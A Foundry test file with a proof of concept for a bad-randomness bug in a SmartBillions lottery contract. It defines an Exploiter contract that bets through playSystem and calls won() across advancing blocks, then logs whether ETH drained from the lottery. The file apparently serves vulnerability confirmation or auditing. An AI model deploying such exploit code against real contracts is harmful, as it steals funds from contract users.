// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/smart_billions.sol";

contract SmartBillionsTest is Test {
    SmartBillions public lottery;
    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        vm.startPrank(owner);
        lottery = new SmartBillions();
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 100 ether);
        vm.stopPrank();
    }

    function testBadRandomnessExploit() public {
        // Attacker deploys malicious contract that checks winning conditions
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(lottery);
        
        // Attacker funds the exploiter contract
        payable(address(exploiter)).transfer(10 ether);
        bool fundsDrained = false;

        // Simulate multiple attempts until winning condition is met
        for(uint i = 0; i < 10; i++) {
            vm.roll(block.number + 10); // Advance blocks
            
            console2.log("---------- BEFORE Attacker Action [Attempt %s] ----------", i+1);
            uint256 lotteryBalanceBefore = address(lottery).balance;
            uint256 exploiterBalanceBefore = address(exploiter).balance;
            console2.log("Lottery Contract ETH Balance (pre-attack):", lotteryBalanceBefore);
            console2.log("Exploiter Contract ETH Balance (pre-attack):", exploiterBalanceBefore);
            console2.log("--------------------------------------------");

            try exploiter.tryExploit() {
                console2.log("------------ TRIGGERED Attacker Action -------------");
                console2.log("Executed tryExploit()");

                console2.log("---------- AFTER Attacker Action [Attempt %s] ----------", i+1);
                uint256 lotteryBalanceAfter = address(lottery).balance;
                uint256 exploiterBalanceAfter = address(exploiter).balance;
                console2.log("Lottery Contract ETH Balance (post-attack):", lotteryBalanceAfter);
                console2.log("Exploiter Contract ETH Balance (post-attack):", exploiterBalanceAfter);

                // Differential verification: Compare balance changes
                if (exploiterBalanceAfter > exploiterBalanceBefore && lotteryBalanceAfter < lotteryBalanceBefore) {
                    console2.log("*** STATE CHANGE VERIFIED: Funds drained from Lottery to Exploiter ***");
                    console2.log("Vulnerability Confirmed: Detected ETH transfer from Lottery to Exploiter");
                    fundsDrained = true;
                } else {
                    console2.log("*** NO BALANCE CHANGE DETECTED ***");
                }
                console2.log("----------------------------------------------------");

                // Break early if exploitation detected
                if(fundsDrained) {
                    console2.log("Vulnerability Exists: Exploit successfully drained ETH from Lottery contract");
                    return;
                }
            } catch {
                console2.log("Exploit attempt failed (transaction reverted)");
                continue;
            }
        }
        vm.stopPrank();
        
        if (!fundsDrained) {
            console2.log("Vulnerability not Exist: No funds drained from Lottery contract after 10 attempts");
        }
    }
}

contract Exploiter {
    SmartBillions public lottery;
    uint public lastBetBlock;

    constructor(SmartBillions _lottery) {
        lottery = _lottery;
    }

    function tryExploit() external payable {
        // Only bet if we haven't already placed a bet in this block
        if(lastBetBlock != block.number) {
            // Place a bet with random hash (will be checked against blockhash)
            lottery.playSystem{value: 1 ether}(uint(blockhash(block.number + 3)), address(0));
            lastBetBlock = block.number;
        }

        // Check if we can win now (blockhash will be available)
        if(block.number > lastBetBlock + 3) {
            lottery.won();
        }
    }

    receive() external payable {}
}